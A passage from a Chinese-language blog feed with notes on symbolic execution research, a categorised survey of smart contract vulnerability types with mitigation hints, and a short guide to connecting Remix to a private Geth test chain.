performance</p></li><li><p><ahref="https://dl.acm.org/doi/abs/10.1145/1595696.1595762">Sireum/TopiLDP: a lightweight semi-decision procedure for optimizing symbolicexecution-based analyses</a></p><p>Most solver implementations are designed to be used as a black box,and due to their aim as general purpose solvers, they often missoptimization opportunities that can be done by leveragingdomain-specific knowledge. We present optimization techniquesincorporated as a lightweight semi-decision procedure (LDP) thatprovides up to an order of magnitude faster analysis time when analyzingrealistic programs and well-known algorithms</p></li><li><p>semantics-preserving transformations</p><p><ahref="https://dl.acm.org/doi/abs/10.1145/3092703.3092728">Acceleratingarray constraints in symbolic execution</a>这个不是启发式搜索，而且他主要针对 符号执行中的 Array，主要是它也用了保留上下文语义的方式优化，所以放在这儿。 One of the mainscalability challenges is related to constraint solving: largeapplications and long exploration paths lead to complex constraints,often <strong>involving big arrays indexed by symbolicexpressions</strong>. We propose a set of semantics-preservingtransformations for array operations that take advantage of contextualinformation collected during symbolic execution. Our transformationslead to simpler encodings and hence better performance in constraintsolving.</p></li></ol></li><li><p>复杂约束的可满足问题转换为优化问题</p><p>通过设定合理的目标函数，复杂约束的可满足问题同样可以转化为优化问题。</p><ol type="1"><li><ahref="https://ieeexplore.ieee.org/abstract/document/7582790">2016.9_Symbolicexecution of complex program driven by machine learning based constraintsolving</a></li></ol><p><em>见开头摘要</em></p><ol type="1"><li><ahref="http://gb.oversea.cnki.net/KCMS/detail/detail.aspx?filename=1017096079.nh&amp;dbcode=CMFD&amp;dbname=CMFD2017">2017.5_基于机器学习约束求解的符号执行框架</a></li></ol><p><em>见书签 Problem&amp;Answer</em> 基于机器学习的优化算法 RACOS基于一个模型对优化空间进行采样，然后通过采样点的评估反馈进行学习并优化模型，接着使用优化后的模型指导下一轮的采样。通过以上采样和反馈学习的不断迭代，RACOS最终完成对优化问题的求解。 <em>见书签 RACOS 的特点</em></p><p>将所有包含复杂数值计算的约束进行编码，将包含复杂函数调用约束编码成了未解释的路径约束。通过设定合理的目标函数，将复杂路径约束的满足性问题转化成了优化问题，然后利用底层的优化算法RACOS 完成对复杂路径约束的求解。</p></li><li><p>预测并选择的最佳的 solver</p><p><ahref="https://www.ndss-symposium.org/wp-content/uploads/bar2019_80_Wen_paper.pdf">EnhancingSymbolic Execution by Machine Learning Based SolverSelection_2019</a></p><p>Path Constraint Classifier (PCC), a machine learning basedmeta-solver that aims to reduce overall constraint solving latency bydynamically selecting a solver per query.</p></li></ol><h4 id="未分类">未分类</h4><ul class="task-list"><li><label><input type="checkbox" />貌似属于启发式</label></li></ul><ol type="1"><li><p><a href="https://arxiv.org/abs/1807.00575">Neuro-SymbolicExecution: The Feasibility of an Inductive Approach to SymbolicExecution_2018</a></p></li><li><p><ahref="https://www.ndss-symposium.org/wp-content/uploads/2019/02/ndss2019_11-3_Shiqi_paper.pdf">Neuro-SymbolicExecution: Augmenting Symbolic Execution with NeuralConstraints_2019</a></p><p>symbolic execution limitations: the path explosion problem encumbersscalability,the need for language-specific implementation, the inabilityto handle complex dependencies, and the limited expressiveness oftheories supported by underlying satisfiability checkers.</p><p>Relationships between variables of interest are not expressibledirectly as purely symbolic constraints.</p><p><strong>neuro-symbolic execution</strong>—which learns anapproximation of the relationship between program values of interest, asa neural network. We develop a procedure for checking satisfiability ofmixed constraints, involving both symbolic expressions and neuralrepresentations.</p><p><em>看一下摘要里面的效果</em> 很厉害的样子</p></li></ol><h3 id="思路二">思路二</h3><ol type="1"><li><p><ahref="http://gb.oversea.cnki.net/KCMS/detail/detail.aspx?filename=1018894893.nh&amp;dbcode=CMFD&amp;dbname=CMFDREF">模糊测试与符号执行相结合</a></p><blockquote><p>虽然采用模糊测试和符号执行交替探索程序执行路径，一方面符号执行解决模糊测试陷入代码覆盖率增长慢的情况，这样能引导模糊测试探索到程序更深层次的节点，另一方面，模糊测试也能直接避免符号执行可能带来的路径爆炸问题。但是一些实验结构表明，基于符号执行增强的模糊测试技术仍然会受限于符号执行中的约束求解问题，符号执行的引入可能会弱化模糊测试本身的可扩展性。--- 来源 <ahref="http://kns.cnki.net/kcms/detail/Detail.aspx?dbname=CAPJLAST&amp;filename=QHXB20181029000&amp;v=">自动化到智能化:软件漏洞挖掘技术进展</a></p></blockquote><ol start="3" type="1"><li><ol start="2" type="1"><li>符号执行与污点分析结合</li></ol></li></ol></li><li><p><ahref="https://dl.acm.org/doi/abs/10.1145/1390630.1390635">Combiningunit-level symbolic execution and system-level concrete execution fortesting nasa software</a></p></li></ol><h3 id="思路三">思路三</h3><p>这只是一个想法，因为我看有些论文为了解决他们的问题，而特意改进符号执行。</p><p>对智能合约的符号执行，不知道智能合约有什么特点，要是有的话，可以针对它去改进符号执行。虽然这样不是解耦合的结构，但是应该能改善智能合约的检测结果。</p><p>下面是一些改进符号执行以适应他们要解决的问题的论文，看一下题目啥的，没准有启发？</p><ol type="1"><li><p><ahref="https://dl.acm.org/doi/10.1145/2451116.2451152">Verifying systemsrules using rule-directed symbolic execution</a></p><p>existing symbolic execution systems often blindly explore manyredundant program paths while missing relevant ones that may containbugs. Our key insight is that only a small portion of paths are relevantto rules, and the rest (majority) of paths are irrelevant and do notneed to be verified.</p></li></ol><h2 id="未分类-1">未分类</h2><ol type="1"><li><p><ahref="http://kns.cnki.net/kcms/detail/Detail.aspx?dbname=CAPJLAST&amp;filename=QHXB20181029000&amp;v=">自动化到智能化:软件漏洞挖掘技术进展</a></p></li><li><p><a href="https://dl.acm.org/doi/abs/10.1145/3182657">A Survey ofSymbolic Execution Techniques</a></p></li><li><p><ahref="https://blog.csdn.net/woswod/article/details/88630219#1.%20%E4%BB%8B%E7%BB%8D">ASurvey of Symbolic Execution Techniques 符号执行中文笔记</a></p></li><li><p><ahref="https://www.cnblogs.com/XBWer/p/9510884.html">软件测试中的符号执行Symbolic Execution for Software Testing: Three DecadesLater</a></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> blockchain </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>调研智能合约漏洞和检测后可考虑的方向</title>
      <link href="/blog/2021/04/30/blockchain/eth_vulns/vuln_idea/"/>
      <url>/blog/2021/04/30/blockchain/eth_vulns/vuln_idea/</url>
      
        <content type="html"><![CDATA[<h1 id="可以考虑的方向">可以考虑的方向</h1><h2 id="call-安全">Call 安全</h2><ol type="1"><li><p>Improper Check or Handling of Exceptional Conditions</p><p>其他名：Exceptions in external calls/Mishandled Exceptions/</p><ol type="1"><li><p>Unchecked Return Value/Uncheck low-level call</p></li><li><p>Exception disorder</p><p>主要是嵌套调用链异常处理不当</p></li><li><p>DoS with Failed External Call/External calls without gasstipends</p></li></ol></li><li><p>Reentrancy(a.k.a. recursive call attack)</p><ol type="1"><li><p>Reentrancy on a Single Function</p></li><li><p>Cross-function Reentrancy</p></li><li><p>Reentrancy Mutex 使用不当 when you have multiple contracts thatneed to cooperate.</p><p>死锁</p></li></ol></li><li><p>Freezing ether</p><ol type="1"><li>只有收钱函数，无转账函数</li><li>通过 delegatecall转账委托给其他合约，如果其他合约死了，就造成此问题</li></ol></li><li><p>Delegatecall to UntrustedCallee/DelegateCallWithUserInput/Controlled Delegatecall</p><p><em>以下漏洞与 Call 有关，但是不都是 call 的错误</em></p></li><li><p>Insufficient Gas Griefing</p><ol type="1"><li><p>require Gasleft 保证 subcall 完成</p><p>审查</p></li></ol></li><li><p>Call to the unknown</p><p>代码写错，未匹配到，默认调用 fallback 函数</p></li><li><p><strong>Call 注入</strong></p></li><li><p>Improper Following of Specification by Caller</p><p>Requirement Violation SWC-123</p></li></ol><h2 id="dos-focus">DOS focus</h2><ol type="1"><li><p>Insufficient Control Flow Management</p><p>Meta transactions Relay 转发者不断提供较少 gas 使其失败，从而不断获取ether 或者形成 Dos</p></li><li><p>DoS With Block Gas Limit</p><ol type="1"><li><p>Gas Limit DoS on a Contract via Unbounded Operations/Loop over anarray of unknown size / Looping through externally manipulated mappingsor arrays/通过外部操纵映射或数组（Array）循环</p><p>lock Ether</p></li><li><p>Gas Limit DoS on the Network via Block Stuffing/Block Stuffingattacks/Transaction congestion Attack/Unclogged blockchain reliance</p><p>Front-runing Suppression/Block Stuffing attacks/TransactionCongestion Attack 拥挤堵塞 <ahref="https://solmaz.io/2018/10/18/anatomy-block-stuffing/">The Anatomyof a Block Stuffing Attack</a></p></li></ol></li><li><p>Owner operations 所有者操作</p></li><li><p>DoS with Failed External Call/External calls without gasstipends</p></li><li><p>Progressing state based on external calls基于外部调用的进展状态</p></li><li><p>Unexpected Ether balance/Forcibly Sending Ether to a Contract</p><p>In the worst case scenario this could lead to DOS conditions thatmight render the contract unusable.</p></li><li><p>DoS with (Unexpected) revert</p><p>恶意退款的 fallback 函数</p></li><li><p>DoS with selfdestruct</p></li></ol><h2 id="gas-foucus">Gas foucus</h2><ol type="1"><li><p>Insufficient Gas Griefing</p><p>subcall fail</p><p>解决方法</p><ol type="1"><li>Require Gasleft 保证 subcall 完成</li><li>Permit only trusted accounts to relay the transaction.</li></ol></li><li><p>Meta transactions Relay</p></li><li><p>Improper Initialization</p><p>Message call with hardcoded gas amount</p></li><li><p>DoS With Block Gas Limit</p><p>Uncontrolled Resource Consumption</p><ol type="1"><li><p>Gas Limit DoS on a Contract via Unbounded Operations/Loop over anarray of unknown size</p><p>lock Ether</p></li><li><p>Gas Limit DoS on the Network via Block Stuffing/Block Stuffingattacks/Transaction congestion Attack</p></li></ol><p>它不只可以用来消耗 Gas， <ahref="https://medium.com/level-k/public-disclosure-malicious-gastoken-minting-236b2f8ace38">还可以通过GasToken 来倒成钱</a></p></li><li><p>GasLess Send/Failed Send</p></li></ol><h2id="inclusion_from_untrusted_control_sphere">inclusion_from_untrusted_control_sphere</h2><ol type="1"><li><p>Reentrancy(a.k.a. recursive call attack)</p><ol type="1"><li><p>Reentrancy on a Single Function</p></li><li><p>Cross-function Reentrancy</p></li><li><p>Reentrancy Mutex 使用不当 when you have multiple contracts thatneed to cooperate.</p><p>死锁</p></li></ol></li><li><p>变量覆盖问题导致任意存储地址写</p><p>可以控制数组偏移时</p></li><li><p>DoS with (Unexpected) revert</p><p>恶意退款的 fallback 函数</p></li><li><p>Weak Sources of Randomness from Chain Attributes/Use ofInsufficiently Random Values/Entropy Illusion</p></li><li><p>Delegatecall to Untrusted Callee</p></li><li><p>Insufficient Gas Griefing</p><pre><code>subcall fail1. Require Gasleft 保证 subcall 完成2. Permit only trusted accounts to relay the transaction.</code></pre></li><li><p>Meta transactions Relay</p><p>转发者不断提供较少 gas 使其失败，从而不断获取 ether 或者形成Dos</p></li></ol><h2 id="fallback-focus">Fallback Focus</h2><ol type="1"><li><p>Reentrancy(a.k.a. recursive call attack)</p><ol type="1"><li><p>Reentrancy on a Single Function</p></li><li><p>Cross-function Reentrancy</p></li><li><p>Reentrancy Mutex 使用不当 when you have multiple contracts thatneed to cooperate.</p><p>死锁</p></li></ol></li><li><p>Call to the unknown</p><p>代码写错，未匹配到，默认调用 fallback 函数</p></li><li><p>DoS with (Unexpected) revert</p><p>恶意退款的 fallback 函数</p></li></ol><h2 id="storage-access">Storage access</h2><ol type="1"><li><p>Uninitialized storage pointer (SWC-109, SP-14)</p><p>Note: As of compiler version 0.5.0 and higher this issue has beensystematically resolved as contracts with uninitialised storage pointersdo no longer compile.</p></li><li><p>Delegatecall and storage layout (SWC-112, SP-4)</p></li><li><p>Overlap attack/Arbitrary Jump with Function TypeVariable</p></li><li><p>变量覆盖问题导致任意存储地址写</p><p>可以控制数组偏移时</p></li><li><p>storge HASH Collisions</p></li></ol><h2 id="flow-focus">Flow focus</h2><h3 id="internal-control-flow">Internal control flow</h3><ol type="1"><li><a href="https://cwe.mitre.org/data/definitions/670.html">CWE-670:Always-Incorrect Control Flow Implementation</a><ol type="1"><li>Assert Violation //存在某条控制流总是错误 1. 有 bug 或者 不该用Assert</li></ol></li><li>Incorrect Inheritance Order</li><li>Arbitrary jump with function type variable (SWC-127)</li><li>Assembly return in constructor: this trick tampers with standarddeployment process; as a result, actually deployed bytecode has littlein common with the source code</li></ol><h3id="improper_enforcement_workflowbehavior-workflow-检测行为工作流行为顺序不当">improper_enforcement_workflow/Behaviorworkflow 检测行为工作流/行为顺序不当</h3><ol type="1"><li><p><ahref="https://cwe.mitre.org/data/definitions/841.html">CWE-841: ImproperEnforcement of Behavioral Workflow</a> 行为工作流的不恰当实施</p><ol type="1"><li><p>Reentrancy(a.k.a. recursive call attack)</p><ol type="1"><li><p>Reentrancy on a Single Function</p></li><li><p>Cross-function Reentrancy</p></li><li><p>Reentrancy Mutex 使用不当 when you have multiple contracts thatneed to cooperate.</p><p>死锁</p></li></ol></li></ol></li><li><p>Insufficient Control Flow Management</p><ol type="1"><li><p>Insufficient Gas Griefing</p><p>subcall fail</p><ol type="1"><li>Require Gasleft 保证 subcall 完成</li><li>Permit only trusted accounts to relay the transaction.</li></ol></li><li><p>Meta transactions Relay</p><p>转发者不断提供较少 gas 使其失败，从而不断获取 ether 或者形成Dos</p></li></ol></li><li><p>Race Condition/Concurrent Execution using Shared Resource withImproper Synchronization</p><p>Front-runnig: 目前最常发生： The ERC20 token standard includes afunction called 'approve', 即: approve 授权函数条件竞争</p><ol type="1"><li><p>Displacement/顶替</p></li><li><p>Insertion/Transaction Order Dependence/Unpredictable state提前插队，倒卖</p><ul><li>TODAmount</li><li>TODReceiver</li><li>TODTransfer</li></ul></li><li><p>Suppression/Block Stuffing attacks/Transaction Congestion Attack拥挤堵塞 <ahref="https://solmaz.io/2018/10/18/anatomy-block-stuffing/">The Anatomyof a Block Stuffing Attack</a></p></li></ol></li><li><p>Exception disorder</p><p>主要是嵌套调用链异常处理不当</p></li></ol><h2 id="委托管理-proxy-replay">委托管理 proxy replay</h2><ol type="1"><li><p>Improper Verification of Cryptographic Signature/Signature ReplayAttacks</p><ol type="1"><li><p>Signature Malleability -- SWC-117</p><p><code>ecrecover</code> A signature should never be included into asigned message hash to check if previously messages have been processedby the contract.</p></li><li><p>Missing Protection against Signature Replay Attacks --SWC-121</p><p>增加对重放攻击的保护，比如: 1.保存每次消息的 hash 2.Include theaddress of the contract that processes the message， 3. SWC-117</p></li><li><p>Lack of Proper Signature Verification -- SWC-122</p><p>sign messages off-chain. This can lead to vulnerabilities especiallyin scenarios where proxies can be used to relay transactions.</p></li></ol></li><li><p>Authentication Bypass by Capture-replay</p><p>Hash Collisions With Multiple Variable Length Arguments</p></li><li><p>Insufficient Gas Griefing</p><pre><code>subcall fail1. Require Gasleft 保证 subcall 完成2. Permit only trusted accounts to relay the transaction.</code></pre></li><li><p>Meta transactions Relay</p><p>转发者不断提供较少 gas 使其失败，从而不断获取 ether 或者形成Dos</p></li></ol><h2 id="authorization-improper-access-control">Authorization/ ImproperAccess Control</h2><ol type="1"><li><p>unintentionally exposing initialization functions。such asConstructor 也可以说是初始化函数可见性问题 -- 见 SWC-105</p><p>Unprotected Ether Withdrawal/Functions that send ether to arbitrarydestinations</p></li><li><p>Unprotected SELFDESTRUCT Instruction/functionality /suicide</p></li><li><p>Function Default Visibility -- Improper Adherence to CodingStandard</p></li><li><p>State Variable Default Visibility/Implicit visibilitylevel(不明确指定可见性）</p></li><li><p>Use of Obsolete Function</p><p>Authorization through tx.origin</p></li><li><p>Keeping secrets/Unencrypted Private Data On-Chain</p></li><li><p><ahref="https://docs.guardrails.io/docs/en/vulnerabilities/solidity/write_to_arbitrary_storage_location">Writeto Arbitrary Storage Location</a></p></li><li><p>变量覆盖问题导致任意存储地址写</p><p>可以控制数组偏移时</p></li><li><p>HASH 碰撞</p><p><a href="https://paper.seebug.org/739/">从一起“盗币”事件看以太坊存储hash 碰撞问题</a></p></li></ol><p>权限管理，可就宽泛了，还有好些可以归到权限管理里面</p><h2 id="contract-interaction">Contract interaction</h2><ol type="1"><li><p>Unchecked low-level call (SWC-104, DASP-4, SP-9)</p></li><li><p>Reentrancy (SWC-107, DASP-1, SP-1)</p></li><li><p>Dos with external call</p></li><li><p>DoS with revert/DoS with Failed Call (SWC-113, SP-11)</p></li><li><p>DoS with selfdestruct (DASP-5)</p></li><li><p>Insufficient Gas Griefing</p><pre><code>subcall fail1. Require Gasleft 保证 subcall 完成2. Permit only trusted accounts to relay the transaction.</code></pre></li><li><p>Meta transactions Relay 转发者不断提供较少 gas使其失败，从而不断获取 ether 或者形成 Dos</p></li></ol><h2 id="low-level-focus">Low-level focus</h2><ol type="1"><li><p>Use of Low-Level Functionality/use assembly instructions</p><ol type="1"><li>Arbitrary Jump with Function Type Variable</li></ol></li><li><p>Uncheck low-level call return Value</p></li><li><p>Constant functions using assembly code</p></li></ol><h2id="entropy-illusionweak-sources-of-randomness-from-chain-attributesuse-of-insufficiently-random-valuesentropy-illusion">EntropyIllusion/Weak Sources of Randomness from Chain Attributes/Use ofInsufficiently Random Values/Entropy Illusion</h2><ol type="1"><li><p>UnsafeDependenceOnBlock</p><ol type="1"><li><code>block.timestamp</code>/Block values as a proxy fortime/Timestamp dependence</li><li><code>block Number</code> Block Number Dependency</li><li><code>blockhash</code></li><li><code>block.difficulty</code></li></ol></li><li><p>UnsafeDependenceOnGas</p></li></ol><h2 id="block-content-manipulation">Block content manipulation</h2><p>Miner assembles block and thus can influence its contents (includedtransactions, their order, other block parameters).</p><p>Front-running / transaction reordering (SWC-114, DASP-7, SP-10)Timestamp manipulation (SWC-116, DASP-8, SP-12) Random with blockhash(SWC-120, DASP-6, SP-6) Transaction censorship (link)</p><h2 id="参照">参照</h2><p><a href="https://swcregistry.io/">SWC Registry</a> <ahref="https://github.com/smartdec/classification">Classification ofsmart contract vulnerabilities</a> <ahref="https://consensys.github.io/smart-contract-best-practices/known_attacks/">KnownAttacks</a> <ahref="https://medium.com/consensys-diligence/silent-but-vulnerable-ethereum-gas-security-concerns-adadf8bfb180">SilentBut Vulnerable: Ethereum Gas Security Concerns</a> <ahref="https://blog.sigmaprime.io/solidity-security.html">SoliditySecurity: Comprehensive list of known attack vectors and commonanti-patterns</a> <ahref="https://github.com/ethereum/wiki/wiki/Safety">ethereum wiki</a> <ahref="https://www.cnblogs.com/XBWer/p/9697361.html#1">智能合约的常见漏洞</a><ahref="https://rickgray.me/2018/05/17/ethereum-smart-contracts-vulnerabilites-review/">以太坊智能合约安全入门了解一下（上）</a><ahref="https://www.8btc.com/article/331416">区块链智能合约安全审计白皮书（2018年）解读</a> <a href="https://paper.seebug.org/633/">以太坊 Solidity合约 call 函数簇滥用导致的安全风险</a></p>]]></content>
      
      
      <categories>
          
          <category> blockchain </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>remix 连接使用 Geth</title>
      <link href="/blog/2021/04/20/blockchain/3.develop2/"/>
      <url>/blog/2021/04/20/blockchain/3.develop2/</url>
      
        <content type="html"><![CDATA[<h1 id="geth">Geth</h1><p>通过 remix 连接 web3provider 直接部署，为私链添加余额<code>miner.start()</code> 然后 <code>miner.stop()</code></p><p><ahref="https://ethereum.stackexchange.com/questions/16253/how-can-i-add-some-balance-to-the-address-in-private-blockchain-testnet">Howcan I add some balance to the address in private blockchain testnet? -Ethereum Stack Exchange</a> <ahref="https://ethereum.stackexchange.com/questions/16040/why-did-it-returned-null-after-call-miner-start">goethereum - why did it returned null after call miner.start() - EthereumStack Exchange</a></p><p>remix 发起交易报错缺少 SHR 解决：<ahref="https://ethereum.stackexchange.com/questions/87245/error-returned-error-invalid-opcode-shr">goethereum - Error: Returned error: invalid opcode: SHR - Ethereum StackExchange</a></p><p>remix点击部署以后，可以看下方的部署日志来判断其在部署，还是有错误。</p><ul><li>创建私链: <code>geth --datadir . init genesis.json</code></li><li>创建新账户: <code>geth account new</code></li><li>进入交互窗口:<code>geth --identity "user_id" --rpc --rpccorsdomain "*" --datadir "./" --port "30303" --nodiscover --rpcapi "personal,db,eth,net,web3,miner" --networkid 15 console 2&gt;&gt;geth.log --allow-insecure-unlock</code></li><li>创建新钱包地址: <code>personal.newAccount("123456")</code></li><li>查看钱包地址: <code>eth.accounts</code></li><li>挖矿，获得 eth:<code>miner.start()</code>、<code>miner.stop()</code></li><li>unlock 地址，以便使用其部署合约:<code>personal.unlockAccount(eth.accounts[0])</code></li><li>remix 连接 web3provider，部署到 geth。先点击 deploy 部署合约,然后挖矿，对该交易进行打包：<code>miner.start()</code>、<code>miner.stop()</code></li></ul><h2 id="阅读">阅读</h2><p><ahref="https://blog.csdn.net/huwh_/article/details/80977642">以太坊系列（二）之账户管理_胡伟煌的博客-CSDN博客</a> <ahref="https://blog.csdn.net/Damionew/article/details/104687053">【区块链】问题集锦（持续更新）_Damionew的博客-CSDN 博客</a> <ahref="http://www.wangxiaoming.com/blog/2018/01/22/HPB-41-ETH-3j-Smart/">HPB41：Web3j实现智能合约 - 汪晓明对区块链、以太坊的思考</a> <ahref="https://blog.csdn.net/huwh_/article/details/80977642">以太坊系列（二）之账户管理_胡伟煌的博客-CSDN博客</a></p>]]></content>
      
      
      <categories>
          
          <category> blockchain </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>智能合约漏洞调研补充</title>
      <link href="/blog/2021/04/15/blockchain/eth_vulns/eth_vulns_2/"/>
      <url>/blog/2021/04/15/blockchain/eth_vulns/eth_vulns_2/</url>
      
        <content type="html"><![CDATA[<h1 id="漏洞分类">漏洞分类</h1><ol type="1"><li><p>Incorrect Calculation/arithmetic issues <a href="#fn1"class="footnote-ref" id="fnref1" role="doc-noteref"><sup>1</sup></a>Integer bugs</p><ol type="1"><li><p>arithmetic bugs</p><p>Integer Overflow and Underflow Division by zero or modulo zero,2）truncation bugs /multiply before divison/Imprecise arithmeticoperations order 3）signedness bugs 目前精通整型溢出漏洞的工具:</p></li></ol><ol type="1"><li>Osiris Integer bugs 论文</li><li><a href="https://paper.seebug.org/626/">ERC20智能合约整数溢出系列漏洞披露</a>提到一个自动化工具可以高效挖掘高危整数溢出漏洞，检测出了文中很多漏洞</li></ol></li><li><p>Use of Incorrect Operator/Typographical Error</p><p>The unary + operator is deprecated in new solidity compilerversions.</p></li><li><p>Using Components with Known Vulnerabilities</p><ol type="1"><li>Outdated Compiler Version</li><li>Compiler version not fixed / Floating Pragma</li></ol></li><li><p>Unchecked Return Value / Handle errors in external calls <ahref="#fn2" class="footnote-ref" id="fnref2"role="doc-noteref"><sup>2</sup></a></p><p>Unchecked Call Return Value Uncheck low-level call</p></li><li><p><ahref="https://cwe.mitre.org/data/definitions/284.html">CWE-284: ImproperAccess Control</a> <a href="#fn3" class="footnote-ref" id="fnref3"role="doc-noteref"><sup>3</sup></a></p><ol type="1"><li><p>Unprotected Ether Withdrawal</p><p>unintentionally exposing initialization functions。such asConstructor 也可以说是初始化函数可见性问题 -- 见 SWC-105</p></li><li><p>Unprotected SELFDESTRUCT Instruction/functionality / suicide <ahref="#fn4" class="footnote-ref" id="fnref4"role="doc-noteref"><sup>4</sup></a></p></li><li><p>Function Default Visibility -- Improper Adherence to CodingStandards<a href="#fn5" class="footnote-ref" id="fnref5"role="doc-noteref"><sup>5</sup></a></p></li><li><p>State Variable Default Visibility/Implicit visibilitylevel(不明确指定可见性）<a href="#fn6" class="footnote-ref" id="fnref6"role="doc-noteref"><sup>6</sup></a></p></li><li><p>Owner 权限问题 避免 owner 权限过大</p></li></ol></li><li><p>Improper Adherence to Coding Standards</p><ol type="1"><li><p>Shadowing State Variables [^write]</p></li><li><p>Function Default Visibility</p></li><li><p>Freezing ether<a href="#fn7" class="footnote-ref" id="fnref7"role="doc-noteref"><sup>7</sup></a></p><p>只有收钱，转账委托给其他合约，delegatecall，如果其他合约死了，就造成此问题</p></li><li><p>Ether lost in transfer</p><p>转向空地址</p></li></ol></li><li><p>Incorrect Inheritance Order[^control_flow]</p></li><li><p>Use of Obsolete Function</p><ol type="1"><li>Use of Deprecated Solidity Functions</li><li>Authorization through tx.origin[^authorization]<a href="#fn8"class="footnote-ref" id="fnref8"role="doc-noteref"><sup>8</sup></a></li></ol></li><li><p><ahref="https://cwe.mitre.org/data/definitions/841.html">CWE-841: ImproperEnforcement of Behavioral Workflow</a> 行为工作流的不恰当实施[^improper_enforcement_workflow]<a href="#fn9" class="footnote-ref"id="fnref9" role="doc-noteref"><sup>9</sup></a></p><ol type="1"><li><p>Reentrancy(a.k.a. recursive call attack) <a href="#fn10"class="footnote-ref" id="fnref10" role="doc-noteref"><sup>10</sup></a><ahref="#fn11" class="footnote-ref" id="fnref11"role="doc-noteref"><sup>11</sup></a></p><ol type="1"><li><p>Reentrancy on a Single Function</p></li><li><p>Cross-function Reentrancy</p></li><li><p>Reentrancy Mutex 使用不当 when you have multiple contracts thatneed to cooperate.</p><p>死锁</p></li></ol></li></ol></li><li><p><ahref="https://cwe.mitre.org/data/definitions/670.html">CWE-670:Always-Incorrect Control Flow Implementation</a>[^control_flow]</p><ol type="1"><li>Assert Violation //存在某条控制流总是错误 1. 有 bug 或者 不该用Assert</li></ol></li><li><p>Insufficient Control Flow Management [^control_flow]</p><ol type="1"><li><p>Insufficient Gas Griefing[^gas]<a href="#fn12"class="footnote-ref" id="fnref12"role="doc-noteref"><sup>12</sup></a></p><p>subcall fail</p><ol type="1"><li>Require Gasleft 保证 subcall 完成</li><li>Permit only trusted accounts to relay the transaction.</li></ol></li><li><p>Meta transactions Relay [^gas]<a href="#fn13"class="footnote-ref" id="fnref13" role="doc-noteref"><sup>13</sup></a><ahref="#fn14" class="footnote-ref" id="fnref14"role="doc-noteref"><sup>14</sup></a><a href="#fn15" class="footnote-ref"id="fnref15" role="doc-noteref"><sup>15</sup></a> 转发者不断提供较少 gas使其失败，从而不断获取 ether 或者形成 Dos</p></li></ol></li><li><p>Call to the unknown <a href="#fn16" class="footnote-ref"id="fnref16" role="doc-noteref"><sup>16</sup></a></p><p>代码写错，未匹配到，默认调用 fallback 函数</p></li><li><p><ahref="https://cwe.mitre.org/data/definitions/829.html">CWE-829:Inclusion of Functionality from Untrusted Control Sphere</a><ahref="#fn17" class="footnote-ref" id="fnref17"role="doc-noteref"><sup>17</sup></a></p><ol type="1"><li>Delegatecall to Untrusted Callee</li></ol></li><li><p>Mishandled Exceptions/Improper Check or Handling of ExceptionalConditions/Exception disorder <a href="#fn18" class="footnote-ref"id="fnref18" role="doc-noteref"><sup>18</sup></a></p><ol type="1"><li>DoS with Failed External Call<a href="#fn19" class="footnote-ref"id="fnref19" role="doc-noteref"><sup>19</sup></a></li><li>未作限制的 DelegateCall</li></ol><p>参考: <a href="https://paper.seebug.org/633/">以太坊 Solidity 合约call 函数簇滥用导致的安全风险</a></p></li><li><p>Call 注入<a href="#fn20" class="footnote-ref" id="fnref20"role="doc-noteref"><sup>20</sup></a></p></li><li><p>Improper Following of Specification by Caller<a href="#fn21"class="footnote-ref" id="fnref21"role="doc-noteref"><sup>21</sup></a></p><ol type="1"><li>Requirement Violation SWC-123</li></ol></li><li><p>Race Condition/Concurrent Execution using Shared Resource withImproper Synchronization</p><p>Front-runnig:<a href="#fn22" class="footnote-ref" id="fnref22"role="doc-noteref"><sup>22</sup></a> 目前最常发生： The ERC20 tokenstandard includes a function called 'approve'</p><ol type="1"><li><p>Displacement/顶替</p></li><li><p>Insertion/Transaction Order Dependence 提前插队，倒卖</p></li><li><p>Suppression/Block Stuffing attacks/Transaction Congestion Attack拥挤堵塞<a href="#fn23" class="footnote-ref" id="fnref23"role="doc-noteref"><sup>23</sup></a></p><p><a href="https://solmaz.io/2018/10/18/anatomy-block-stuffing/">TheAnatomy of a Block Stuffing Attack</a></p></li></ol></li><li><p>Weak Sources of Randomness from Chain Attributes/Use ofInsufficiently Random Values/Entropy Illusion<a href="#fn24"class="footnote-ref" id="fnref24"role="doc-noteref"><sup>24</sup></a></p><p><code>block.timestamp、blockhash</code> ,  <code>block.difficulty</code> <code>block Number</code> 都是不安全的 1.Block values as a proxy for time/Timestamp dependence 2. Block NumberDependency</p></li><li><p>Improper Verification of Cryptographic Signature/Signature ReplayAttacks[^authorization]</p><ol type="1"><li><p>Signature Malleability -- SWC-117</p><p><code>ecrecover</code> A signature should never be included into asigned message hash to check if previously messages have been processedby the contract.</p></li><li><p>Missing Protection against Signature Replay Attacks --SWC-121</p><p>增加对重放攻击的保护，比如: 1.保存每次消息的 hash 2.Include theaddress of the contract that processes the message， 3. SWC-117</p></li><li><p>Lack of Proper Signature Verification -- SWC-122</p><p>sign messages off-chain. This can lead to vulnerabilities especiallyin scenarios where proxies can be used to relay transactions.</p></li></ol></li><li><p>Write-what-where Condition</p><p>Write to Arbitrary Storage Location<a href="#fn25"class="footnote-ref" id="fnref25"role="doc-noteref"><sup>25</sup></a></p></li><li><p>Use of Low-Level Functionality/Assembly instructions</p><ol type="1"><li>Arbitrary Jump with Function Type Variable</li></ol></li><li><p>User Interface (UI) Misrepresentation of Critical Information</p><p>Right-To-Left-Override control character (U+202E)</p></li><li><p>Irrelevant Code/Dead code</p><ol type="1"><li>Presence of unused variables</li><li>Code With No Effects</li></ol></li><li><p>Improper Locking</p><p>Unexpected Ether balance/Forcibly Sending Ether to a Contract<ahref="#fn26" class="footnote-ref" id="fnref26"role="doc-noteref"><sup>26</sup></a> In the worst case scenario thiscould lead to DOS conditions that might render the contractunusable.</p></li><li><p>Keeping secrets/Unencrypted Private Data On-Chain<a href="#fn27"class="footnote-ref" id="fnref27"role="doc-noteref"><sup>27</sup></a></p><p>Access to Critical Private Variable via Public Method</p></li><li><p>Authentication Bypass by Capture-replay[^authorization]</p><p>Hash Collisions With Multiple Variable Length Arguments</p></li><li><p>Improper Initialization</p><p>Message call with hardcoded gas amount[^gas]</p></li><li><p>Gas</p><ol type="1"><li><p>Uncontrolled Resource Consumption</p><p>DoS With Block Gas Limit<a href="#fn28" class="footnote-ref"id="fnref28" role="doc-noteref"><sup>28</sup></a></p><ol type="1"><li><p>Gas 